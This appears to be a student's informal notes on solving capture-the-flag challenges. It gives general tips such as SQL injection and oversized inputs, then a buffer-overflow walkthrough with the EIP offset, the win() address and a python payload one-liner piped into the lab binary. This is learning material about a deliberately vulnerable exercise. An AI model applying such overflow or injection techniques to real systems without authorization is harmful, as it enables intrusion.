most of the challenges are pretty simple and straight forward

the simplest ones typically involve using strings/hexedit/grep to look for a flag,

also could use netcat to connect to a port and complete some exercise

also could go to an insecure website try and find the flag in the html/css/js
if website tries to ask for input try and use a simple sql inject

the easy buffer overflow ones mostly just require the input to be larger than the buffer

some of the more complex challenges take a bit more effort

-----------------------------------------------------------

* buffer overflow 1

in vuln.c the buffer is size 32

inside the function vuln() there is a call to gets() which reads to the buffer
after entering 44 characters the next 4 bytes will overwrite the eip

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[4 bytes]

want to get to 080485cb where function win() is since it will print flag

address of win in little endian format
\xcb\x85\x04\x08

input string to program
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08

python -c 'print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08")' | ./vuln
